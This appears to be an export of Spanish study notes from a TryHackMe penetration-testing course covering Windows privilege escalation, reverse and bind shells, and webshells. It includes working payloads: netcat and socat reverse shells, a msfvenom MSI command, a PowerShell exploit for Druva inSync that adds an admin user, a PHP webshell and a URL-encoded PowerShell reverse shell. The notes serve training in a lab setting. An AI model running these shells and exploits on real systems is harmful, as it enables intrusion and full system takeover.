BUILTIN\\Users:(I)(F)\n```\n\nComo podemos ver en el resultado, el grupo **BUILTIN\\Users** tiene acceso completo (**F**) sobre el binario. Esto significa que podemos modificar el archivo `.bar` e insertar cualquier payload que queramos. Cambiemos el binario a:\n\n```powershell\ncmd /c \"echo C:\\tools\\nc64.exe -e powershell.exe 192.168.128.94 4444 > C:\\tasks\\schtask.bat\"\n```\n\nLuego comenzamos un listener en nuestra m√°quina:\n\n`nc -lvp 4444`\n\nLa pr√≥xima vez que se ejecute la tarea programada, recibiremos una reverse shell con los privilegios del usuario `taskusr1`.\n\nSi puedes ejecutar la tarea para no tener que esperar, hazlo con: `schtasks /run /tn vulntask`.\n\n-----------------------------------\n<h2>AlwaysInstallElevated</h2>\nLos archivos Windows Installer, tambi√©n conocidos como archivos `.msi`, se usan para instalar aplicaciones en el sistema. Suelen correr con los privilegios del usuario que los ejecuta. Sin embargo pueden ser configurados para correr con privilegios superiores (incluso desde una cuenta sin privilegios). Esto nos permitir√≠a generar archivos MSI maliciosos que corrieran con permisos de administrador.\n\nEste m√©todo requiere que haya dos valores registry configurados. Puedes encontrar estos desde la linea de comandos usando los comandos de abajo:\n\n```cmd\nC:\\> reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\nC:\\> reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n```\n\nSi **AMBOS** est√°n configurados, puedes generar un archivo MSI malicioso con msfvenom as√≠:\n\n`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`\n\nComo es una reverse shell debes ejecutar el handler de Metasploit correctamente configurado. Una vez configurado puedes ejecutar el archivo MSI de la siguiente forma y recibir√°s la shell.\n\n```cmd\nC:\\> msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Abusing Vulnerable Software",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/3-windows-privilege-escalation/6-abusing-vulnerable-software/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/3. Windows Privilege Escalation/6. Abusing Vulnerable Software.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 3. Windows Privilege Escalation",
    "content": "<h2>Unpatched Software</h2>\nEl software instalado en el sistema objetivo, puede presentar varios tipos de oportunidades de escalada de privilegios. Con los drivers, puede que los usuarios y organizaciones no los actualicen tan recurrentemente como el sistema operativo. Puedes usar la herramienta `wmic` para listar el software instalado en el sistema objetivo y sus versiones. El comando de abajo dumpear√° informaci√≥n que recolecte del software instalado.\n\n`wmic product get name,version,vendor`\n\n>[!CAUTION] Puede que `wmic product` no liste todos los programas instalados. Dependiendo de su m√©todo de instalaci√≥n algunos pueden no aparecer.\n\nUna vez recopilada la informaci√≥n, siempre podemos buscar exploits existentes en el software instalado en sitios como [exploit-db](https://www.exploit-db.com/), [packet storm](https://packetstormsecurity.com/) o Google entre otros.\n\n-------------------------------------------\n<h2>Caso de Estudio: Druva inSync 6.6.3</h2>\n El servidor objetivo corre Druva inSync 6.6.3, que es vulnerable a la escalada de privilegios reportada por [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). La vulnerabilidad resulta de un parche mal aplicado sobre otra vulnerabilidad reportada para la versi√≥n 6.5.0 por [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12).\n\nEl software es vulnerable porque corre un servidor RPC (Remote Procedure Call) en el puerto 6064 con privilegios SYSTEM, accesible solo desde localhost.\n\n>[!NOTE] RPC es un mecanismo que permite a un proceso dado exponer funciones (llamados procedimientos) a la red para que otras m√°quinas puedan llamarlas remotamente.\n\nEn el caso de Druva, uno de estos procedimientos (el n√∫mero 5), en el puerto 6064 permite a cualquiera pedir la ejecuci√≥n de cualquier comando. Como corre con privilegios SYSTEM, dicho comando se ejecuta con esos privilegios.\n\nLa vulnerabilidad original (en la 6.5.0) permit√≠a ejecutar cualquier comando sin restricciones. La idea de esto era permitir ejecutar ciertos binarios de forma remota, m√°s que permitir la ejecuci√≥n de cualquier comando.\n\nSali√≥ un parche donde decidieron que la mejor manera de solventarlo era comprobar que el comando comenzaba con `C:\\ProgramData\\Druva\\inSync4\\`, donde se supon√≠a que estaban los binarios autorizados. Para sobrepasar este control pobre, vale con realizar un Path Traversal: `C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe`.\n\nPara entenderlo del todo, necesitamos saber c√≥mo hablar con el puerto 6064. Por suerte el protocolo usado es sencillo.\n\n![[Pasted image 20251201183806.png]]\n\nPublicado por Matteo Malvica [aqu√≠](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html), el siguiente exploit puede usarse en la m√°quina objetivo para elevar privilegios.\n\n```powershell\n$ErrorActionPreference = \"Stop\"\n\n$cmd = \"net user pwnd /add\"\n\n$s = New-Object System.Net.Sockets.Socket(\n    [System.Net.Sockets.AddressFamily]::InterNetwork,\n    [System.Net.Sockets.SocketType]::Stream,\n    [System.Net.Sockets.ProtocolType]::Tcp\n)\n$s.Connect(\"127.0.0.1\", 6064)\n\n$header = [System.Text.Encoding]::UTF8.GetBytes(\"inSync PHC RPCW[v0002]\")\n$rpcType = [System.Text.Encoding]::UTF8.GetBytes(\"$([char]0x0005)`0`0`0\")\n$command = [System.Text.Encoding]::Unicode.GetBytes(\"C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\");\n$length = [System.BitConverter]::GetBytes($command.Length);\n\n$s.Send($header)\n$s.Send($rpcType)\n$s.Send($length)\n$s.Send($command)\n```\n\n\n>[!IMPORTANT] Cambia la variable `cmd` por lo que quieras ejecutar.\n\nPara esta tarea cambiaremos el comando para usar: `net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add`\n\nEsto crear√° un usuario `pwnd` con la contrase√±a `SimplePass123` y lo a√±adir√° al grupo de administradores.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "10. Metasploit multi-handler",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/10-metasploit-multi-handler/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/10. Metasploit multi-handler.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Multi/handler es una herramienta genial para capturar reverse shells. Es esencial si quieres usar las shells de Meterpreter y es la opci√≥n m√°s confiable al usar payloads staged.\n\nPor suerte es relativamente f√°cil de usar:\n\n1. Abre Metasploit con `msfconsole`.\n2. Escribe `use exploit/multi/handler` y presiona enter.\n\nSe mostrar√° una sesi√≥n de multi/handler empezada. Veamos las opciones disponibles usando `options`:\n\n![[Pasted image 20251125122426.png]]\n\nHay tres opciones que necesitamos configurar: payload, LHOST y LPORT. Para hacer esto usamos respectivamente:\n\n- `set PAYLOAD <payload>`\n- `set LHOST <ip_escucha>`\n- `set LPORT <puerto_escucha>`\n\nAhora estamos listos para arrancar el listener. Para hacerlo usaremos `exploit -j`.\n\n![[Pasted image 20251125122649.png]]\n\nEsto le dice a Metasploit que lo lance como un trabajo (**j**ob) en segundo plano.\n\n>[!CAUTION] Para poder escuchar en un puerto menor que el 1024 (como pasaba con netcat), Metasploit debe correr con permisos de administrador.\n\nCuando ejecutamos el payload generado en la tarea anterior, Metasploit recibe la conexi√≥n, mandando un recordatorio del payload y d√°ndonos una recerse shell.\n\n![[Pasted image 20251125122921.png]]\n\nComo el multi/handler estaba en segundo plano, necesitamos traerlo al primer plano usando `sessions 1`. Si hubiera m√°s sesiones activas, tendr√≠amos qu emirar cu√°l es con `sessions` y seleccionar el n√∫mero correcto en lugar de `1`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Tools",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/2-tools/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/2. Tools.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Hay una variedad de herramientas que usaremos para recibir reverse shells y mandar bind shells. En t√©rminos generales, necesitamos c√≥digo malicioso y una forma de interactuar con la shell resultante.\n\n-----------------------------------\n<h2>Netcat</h2>\nNetcat es la navaja suiza del networking. Se usa para realizar manualmente todo tipo de interacciones, incluyendo la recopilaci√≥n de banners durante la enumeraci√≥n, pero m√°s importantemente para nuestros usos, puede ser usado para recibir reverse shells y conectarnos a puertos remotos conectados a bind shells en el sistema objetivo. Son bastante inestables.\n\n--------------------------------------\n<h2>Socat</h2>\nEs como un Netcat con esteroides. Puede hacer todas las cosas anteriores y m√°s. Suelen ser m√°s estables que las de Netcat. Es superior a Netcat, pero hay dos peros:\n\n1. La sintaxis es m√°s complicada.\n2. Netcat suele estar instalado en las distros pero Socat no.\n\n---------------------------------\n<h2>Metasploit - multi/handler</h2>\nEl m√≥dulo `exploit/multi/handler` de Metasploit es como socat y netcat, usado para recibir reverse shells. Es la √∫nica manera de interactuar con la shell meterpreter.\n\n--------------------------------------\n<h2>Msfvenom</h2>\nEs parte del framework Metasploit. Se usa para generar payloads. \n\n------------------------------\nKali viene con una cantidad de payloads de reverse shell preinstalados en `/usr/share/webshells`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "13. Practice and Examples",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/13-practice-and-examples/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/13. Practice and Examples.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Esta unidad ha sido muy densa en cuanto a conocimientos e informaci√≥n y tuvimos pocas oportunidades de poner en pr√°ctica los conocimientos adquiridos. Las siguientes dos tareas contienen dos m√°quinas virtuales (una Ubuntu 18.04 Server y otra Windows Server). Cada una configurada con un webserver sencillo donde puedes subir y activar shells. Como es un entorno preparado para ello, no habr√° filtros que sobrepasar.\n\nSe te dar√°n credenciales e instrucciones para cada una. Deber√≠as ntentar logueartet para practicar con netcat, socat o shells meterpreter.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Socat Encrypted Shells",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/7-socat-encrypted-shells/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/7. Socat Encrypted Shells.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Una de las mejores cosas sobre socat es su capacidad de crear shells encriptadas (tanto reverse como bind). Las shells encriptadas no son descifrables (a menos que tengas la clave de cifrado) lo que hace que muchos IDSs no puedan detectarlas.\n\nNo vamos a cubrir la sintaxis de nuevo. Basta con decir que cada sitio donde aparezca `TCP` hay que sustituirlo por `OPENSSL`.\n\nHablemos de certificados.\n\nNecesitamos generar un certificado para poder usar shells encriptadas. Esto es m√°s f√°cil de hacer en nuestra m√°quina:\n\n`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`\n\nEste comando crea una clave RSA de 2048 bits con su certificado correspondiente, auto-firmado y v√°lido s√≥lo por 362 d√≠as. Lo que te pide rellenar al ejecutar dicho comando puede ser dejado en blanco o rellenado aleatoriamente.\n\nAhora tenemos que combinar ambos archivos en un solo archivo `.pem`:\n\n`cat shell.key shell.crt > shell.pem`\n\nY ahora, para configurar el listener reverse shell:\n\n`socat OPENSSL-LISTEN:<puerto>,cert=shell.pem,verify=0 -`\n\nEsto configura un listener OPENSSL usando nuestro certificado. Mientras, `verify=0` le dice a la conexi√≥n que no se preocupe por validar el certificado.\n\nPara conectarnos de vuelta, usar√≠amos:\n\n`socat OPENSSL:<ip_local>:<puerto_local>,verify=0 EXEC:/bin/bash`\n\nLa misma t√©cnica aplicar√≠a para la bind:\n\nObjetivo:\n\n`socat OPENSSL-LISTEN:<puerto>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`\n\nAtacante:\n\n`socat OPENSSL:<ip_objetivo>:<puerto_objetivo>, verify=0 -`\n\nDe nuevo, date cuenta de que incluso para un objetivo Windows, el certificado debe ser usado por el listener, por lo que para una bind shell se requiere copiar el archivo `.pem`.\n\nVeamos un ejemplo, el atacante a la izquierda y el objetivo a la derecha:\n\n![[Pasted image 20251124175937.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "14. Linux Practice Box",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/14-linux-practice-box/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/14. Linux Practice Box.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Puedes iniciar sesi√≥n por SSH con:\n\n- Username: `shell`\n- Password: `TryH4ckM3!`\n\nSin embargo, deber√≠as intentar aplicar los conocimientos adquiridos sobre webshells.\n\n-------------------------------\n\n1. Intenta subir una webshell, luego usa el comando `nc <ip_local> <puerto> -e /bin/bash` para mandar una reverse shell a un listener en tu m√°quina.\n\t1. Guardamos la webshell en un archivo `shell.php`.\n\t   ![[Pasted image 20251125161433.png]]\n\t2. Subimos el archivo.\n\t   ![[Pasted image 20251125161610.png]]\n\t3. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125162215.png]]\n\t4. Mandamos la shell.\n\t   ![[Pasted image 20251125161949.png]]\n\t5. Recibimos la shell.\n\t   ![[Pasted image 20251125162339.png]]\n2. Navega a `/usr/share/webshells/php/php-reverse-shell.php` en Kali y cambia la IP y puerto para que coincida con un listener en tu m√°quina y sube la webshell al webserver.\n\t1. Copiamos la shell y la editamos.\n\t   ![[Pasted image 20251125164002.png]]\n\t2. Cambiamos lo que nos dice.\n\t   ![[Pasted image 20251125163934.png]]\n\t3. Subimos el archivo.\n\t   ![[Pasted image 20251125164050.png]]\n\t4. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125164118.png]]\n\t5. Cargamos la URL y as√≠ recibimos la shell.\n\t   ![[Pasted image 20251125164229.png]]\n3. Inicia sesi√≥n en la m√°quina Linux a trav√©s de SSH usando las credenciales proporcionadas. Usa t√©cnicas de la tarea 8 para experimentar con shells de netcat tanto reverse como bind.\n\t1. Iniciamos sesi√≥n con SSH.\n\t   ![[Pasted image 20251125164717.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251125173336.png]]\n\t3. Ejecutamos uno de los c√≥digo vistos en la tarea 8 para conseguir una reverse shell.\n\t   ![[Pasted image 20251125173614.png]]\n\t4. Recibimos la shell.\n\t   ![[Pasted image 20251125173650.png]]\n\t5. Ahora vamos a probar el comando para conseguir una bind shell.\n\t   ![[Pasted image 20251125174128.png]]\n\t6. Nos conectamos desde nuestra m√°quina.\n\t   ![[Pasted image 20251125174316.png]]\n\t7. Probamos la reverse shell con `nc`.\n\t   ![[Pasted image 20251125174526.png]]\n\t   ![[Pasted image 20251125174544.png]]\n\t   ![[Pasted image 20251125174631.png]]\n\t8. Probamos la bind shell con `nc`.\n\t   ![[Pasted image 20251125175118.png]]\n\t   ![[Pasted image 20251125175149.png]]\n4. Practica reverse y bind shells usando Socat en la m√°quina Linux. Prueba t√©cnicas normales y especiales.\n\t1. Empezamos con la bind con t√©cnica normal poni√©ndonos en escucha.\n\t   ![[Pasted image 20251125175722.png]]\n\t2. Nos conectamos a la bind shell desde la atacante.\n\t   ![[Pasted image 20251125175901.png]]\n\t3. Seguimos con la reverse shell de t√©cnica normal. Lanzamos un listener en la m√°quina atacante.\n\t   ![[Pasted image 20251125180053.png]]\n\t4. Lanzamos la reverse shell desde el objetivo.\n\t   ![[Pasted image 20251125181012.png]]\n\t5. Recibimos la shell.\n\t   ![[Pasted image 20251125181040.png]]\n\t6. Vamos ahora con la t√©cnica especial. Primero configuramos el listener especial.\n\t   ![[Pasted image 20251125181656.png]]\n\t7. Ejecutamos la reverse shell.\n\t   ![[Pasted image 20251125181958.png]]\n\t8. Recibimos la shell.\n\t   ![[Pasted image 20251125182023.png]]\n5. √âchale un vistazo a [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). Intenta analizarlas y ver por qu√© funcionan.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Netcat",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/4-netcat/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/4. Netcat.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Como ya hemos mencionado, Netcat es la herramienta m√°s b√°sica en el set de herramientas de un pentester. Con ella podemos hacer una variedad de cosas muy interesantes.\n\n------------------------------------\n<h2>Reveserse Shells</h2>\nEn la tarea anterior hemos visto que las reverse shells requieren un c√≥digo malicioso y un listener. Hay varias maneras de ejecutar una shell, as√≠ que empezaremos por los listeners.\n\nLa sintaxis para arrancar un listener con Netcat es:\n\n`nc -lvnp <puerto>`\n\n- `-l`: Para indicar que debe escuchar.\n- `-v`: Para obtener verbose.\n- `-n`: Para no resolver host names o usar DNS.\n- `-p`: Indica el puerto.\n\n-------------------------------\n<h2>Bind Shells</h2>\nSi buscamos obtener una bind shell, asumimos que ya hay un listener esper√°ndonos en un puerto, s√≥lo tenemos que conectarnos a √©l.\n\n`nc <ip_objetivo> <puerto_objetivo>`",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Netcat Shell Stabilisation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/5-netcat-shell-stabilisation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/5. Netcat Shell Stabilisation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Nos hemos conectado a la shell, pero ¬øahora qu√©?\n\nEstas shells son muy inestables: no son interactivas, tienen errores de formato, etc. Esto ocurre porque estas shells no son shells de verdad sino procesos de una terminal. Por suerte, existen varias formas de estabilizarlas.\n\n----------------------------------\n<h2>T√©cnica 1: Python</h2>\nLa primera t√©cnica que veremos es aplicable a entornos Linux ya que tienen instalado Python por defecto. Es un proceso de tres fases:\n\n1. Lo primero que debemos hacer es usar `python -c 'import pty;pty.spawn(\"/bin/bash\")'`. Esto hace que python cree una shell mejorada que corra bash.\n2. Luego hacemos `export TERM=xterm`. Esto nos dar√° acceso a comandos como `clear`.\n3. Por √∫ltimo (y m√°s importante), ponemos la shell en segundo plano `Ctrl+Z`. En nuestra propia terminal escribimos `stty raw -echo; fg`. Esto hace dos cosas:\n\t1. Apaga el echo de nuestra terminal, lo que nos da acceso a autocompletado, flechas de direcci√≥n y `Ctrl+C` para matar procesos en la reverse shell.\n\t2. Poner la reverse shell en primer plano.\n\n\n>[!CAUTION] Algunos sistemas pueden requerir la versi√≥n espec√≠fica, si `python` no funciona prueba a usar `python2` o `python3`.\n\n![[Pasted image 20251124150453.png]]\n\n>[!CAUTION] Si la shell termina, no podremos ver nada en nuestra terminal debido al comando que hemos usado. Para arreglar esto escribe `reset`.\n>\n\n------------------------------------\n<h2>T√©cnica 2: rlwrap</h2>\nRlwrap es un programa el cual nos da acceso al historial, autocompletado y las flechas de direcci√≥n al recibir una shell. Sin embargo, hay cierta configuraci√≥n manual necesaria si quieres usar `Ctrl+C` dentro de la shell.\n\n`rlwrap nc -lvnp <puerto>`\n\nCuando ya la tenemos, usamos `Ctrl+Z` y luego `stty raw -echo;fg` para terminar de estabilizarla.\n\n-----------------------------------------\n<h2>T√©cnica 3: Socat</h2>\nLa tercera manera de estabilizar una shell es usar netcat como m√©todo de pivoting para obtener una consola socat, m√°s estable. Esta t√©cnica s√≥lo es √∫til en Linux, pues en Windows una shell netcat y una socat tienen la misma manera de estabilizarse. Para conseguir este m√©todo, primero transladar√≠amos este archivo [binario](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) a la m√°quina objetivo. Una forma de hacer esto es servir un servidor en el directorio de tu m√°quina donde tengas el binario y acceder desde la m√°quina objetivo a √©l.\n\n1. `sudo python3 -m http.server 8080` (en tu m√°quina local).\n2. `wget <ip_atacante:<puerto>>/socat -O /tmp/socat` (en la m√°quina atacada).\n\nPara conseguir esto en Windows puedes usar `Invoke-WebRequest -uri <ip_atacante:<puerto>>/socat.exe -outfile C:\\\\Windows\\temp\\socat.exe`.\n\n--------------------------------\nCualquiera de estas tres t√©cnicas es √∫til para cambiar la terminal. Pero si quieres poder abrir un editor de texto en la terminal, deber√°s hacer lo siguiente:\n\n1. Abre otra terminal y ejecuta `stty -a`. Esto te dar√° dos valores: rows (filas) y columns (columnas).\n   ![[Pasted image 20251124152825.png]]\n2. En tu reverse/bind shell ejecuta `stty rows <numero_filas>` y `stty cols <numero_columnas>`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "12. Next Steps",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/12-next-steps/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/12. Next Steps.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Vale, ya tenemos una shell. ¬øY ahora qu√©?\n\nHemos cubierto varias maneras de generar, mandar y recibir shells. Lo que tienen todas en com√∫n es que suelen ser inestables y no interactivas. as√≠ que ¬øqu√© podemos hacer respecto a esto?\n\nEn Linux, idealmente estar√≠amos buscando oportunidades para ganar accceso a la cuenta del usuario. Las claves SSH guardadas en `/home/<user>/.ssh` son normalmente una forma ideal de hacerlo. En CTFs no es infrecuente encontrar credenciales sueltas por ah√≠. Algunos exploits te permitir√°n a√±adir tu propia cuenta. En particular, algo como [Dirty C0w](https://dirtycow.ninja/) o un archivo `/etc/shadow` o `/etc/passwd` escribible, te dar√≠an r√°pido acceso a la m√°quina asumiendo que SSH est√© abierto.\n\nEn Windows, las opciones suelen ser m√°s limitadas. A veces es posible encontrar contrase√±as de servicios corriendo en el registro. Los servidores VNC, por ejemplo, frecuentemente dejan contrase√±as guardadas en el registro en texto plano. Algunas versiones del servidor FileZilla FTP tambi√©n dejan credenciales en un archivo XML en `C:\\Program Files\\FileZilla Server\\FileZilla Server.xml` o `C:\\xampp\\FileZilla Server\\FileZilla Server.xml`. Estos pueden ser hashes MD5 o texto plano, dependiendo de la versi√≥n.\n\nIdealmente, en Windows obtendr√≠as una shell como el usuario SYSTEM o una cuenta de administrador con privilegios elevados. Es posible, en dicho caso, a√±adir tu propia cuenta (en el grupo de administradores) en la m√°quina y luego iniciar sesi√≥n mediante RDP, telnet, winexe, psexec, WinRM o cualquier otro m√©todo.\n\nLa sintaxis para esto es:\n\n`net user <nombre_usuario> <contrase√±a> /add`\n\n`net localgroup administrators <nombre_usuario> /add`\n\n>[!IMPORTANT] Las reverse y bind shells son una t√©cnica esencial para entablar un RCE. Sin embargo, nos interesa migrar a una forma \"leg√≠tima\" de conectarnos al sistema, con el objetivo de obtener todas las funcionalidades/ventajas que ofrece frente a una reverse/bind shell.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "11. Webshells",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/11-webshells/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/11. Webshells.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Hay momentos en los que nos encontramos con sitios web que nos dan la oportunidad de subir, de una forma u otra, un archivo ejecutable. Idealmente, usar√≠amos esta oportunidad para subir c√≥digo que activase una reverse o bind shell, pero a veces no es posible. En estos casos, podr√≠amos subir en su lugar una webshell. \n\n\"Webshell\" es un t√©rmino coloquial para un script que corre dentro de un servidor (normalmente en PHP o ASP) que ejecuta c√≥digo en el servidor. Los comandos se introducen en la web, ya sea a trav√©s de HTML (como un formulario) o directamente en par√°metros de la URL.\n\nPHP sigue siendo el lenguaje de scripting m√°s com√∫n del lado del servidor. Veamos un poco de c√≥digo simple.\n\n`<?php echo \"< pre>\" . shell_exec($_GET[\"cmd\"]) . \"< /pre>\"; ?>`\n\nEsto, tomar√° el par√°metro GET en la URL y lo ejecutar√° en el sistema con `shell_exec()`. Lo que significa que cualquier cosa que metamos en la URL despu√©s de `cmd=`, se ejecutar√° en el servidor. Los elementos `< pre >` son s√≥lo para asegurarnos de que se formatea correctamente en en la p√°gina.\n\n>[!CAUTION] Los elementos pre van sin espacios, est√°n escritos as√≠ para no ser interpretados.\n>\n\n\n![[Pasted image 20251125130855.png]]\n\nHay una gran variedad de webshells disponibles en Kali en `/usr/share/webshells`.\n\n>[!IMPORTANT] La mayor√≠a de webshells escritas en PHP se escriben para sistemas Unix, por lo que no funcionar√°n en Windows.\n\nPara obtener RCE en un objetivo Windows, con el ejemplo anterior, podemos usar:\n\n`powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22`\n\nEs la misma que la de la tarea 8, solo que URL-encodeada.\n\n>[!CAUTION] Recuerda cambiar la IP y el puerto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Socat",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/1-what-the-shell/6-socat/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/1. What the Shell/6. Socat.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 1. What the Shell",
    "content": "Socat es similar a netcat en muchos aspectos, pero fundamentalmente diferente en otros tantos. La forma m√°s sencilla de entender socat es pensar en un conector entre dos puntos.\n\n-------------------------------\n<h2>Reverse Shells</h2>\nLa sintaxis de socat se complica bastante m√°s que la de netcat.\n\n`socat TCP-L:<puerto> -`\n\nEsto est√° tomando dos puntos (un puerto en escucha y el standard input) y conect√°ndolos.La shell resultante no es estable.\n\nEn Windows podr√≠amos usar este comando para conectarnos de vuelta: `socat TCP:<ip_local>:<puerto_local> EXEC:powershell.exe,pipes`\n\nLa opci√≥n `pipes` se usa para forzar que powershell use el input output al estilo Unix.\n\nEl comando equivalente para un objetivo Linux: `socat TCP:<ip_local>:<puerto_local> EXEC:\"bash -li\"`\n\n--------------------------------------\n<h2>Bind Shells</h2>\nEn un objetivo Linux, usar√≠amos el siguiente comando:\n\n`socat TCP-L:<puerto> EXEC:\"bash -li\"`\n\nY en uno Windows:\n\n`socat TCP-L:<puerto> EXEC:powershell.exe,pipes`\n\nSin importar el objetivo, usamos el siguiente comando para conectarnos desde nuestra m√°quina al listener activo:\n\n`socat TCP:<ip_objetivo>:<puerto_objetivo> -`\n\n--------------------------------------\nVeamos ahora uno de los usos m√°s poderosos de Socat: una tty Linux reverse shell totalmente estable. Esto s√≥lo funcionar√° si el objetivo es Linux.\n\nEsta es la sintaxis del listener:\n\n``socat TCP-L:<port> FILE:`tty`,raw,echo=0``\n\nEstamos conectando dos partes entre s√≠, en este caso un puerto en escucha y un archivo. Espec√≠ficamente, estamos pasando la TTY actual como un archivo y configurando echo a 0. Esto es lo mismo que hacer `Ctrl+Z` y `stty raw -echo; fg`.\n\nEl primer listener puede ser conectado a 